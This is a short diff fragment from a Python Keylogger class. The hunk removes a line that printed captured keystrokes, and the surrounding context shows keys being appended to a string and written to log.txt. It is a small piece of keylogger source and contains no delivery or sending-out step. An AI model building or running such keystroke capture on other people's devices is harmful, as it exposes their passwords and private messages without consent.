@@ -67,7 +67,6 @@ class Keylogger:
                 self.string += ' [' + str(key).strip('Key.') + '] '
         except:
             self.string += "??"
-        print(self.string)
 
     def log(self):
         with open("log.txt","a") as f:
